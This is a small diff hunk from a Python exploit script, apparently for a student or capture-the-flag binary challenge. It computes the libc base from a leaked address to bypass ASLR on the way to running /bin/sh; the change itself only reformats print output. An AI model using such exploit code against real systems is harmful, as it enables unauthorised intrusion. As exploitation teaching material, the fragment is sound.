@@ -71,11 +71,11 @@ offset = leak - libc_start_noaslr
 # with aslr:
 # leak - 0x75e10 -> libc start
 
-print("offset:", offset, hex(offset))
+print("offset:", hex(offset))
 libc_start = hex(leak - 0x75E10)
 
-print("libc start:", libc_start)
-print("compare with gdb> info proc map")
+print("libc start:", libc_start, end="")
+print(" (compare with gdb> info proc map)")
 
 r = p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
 print(r)
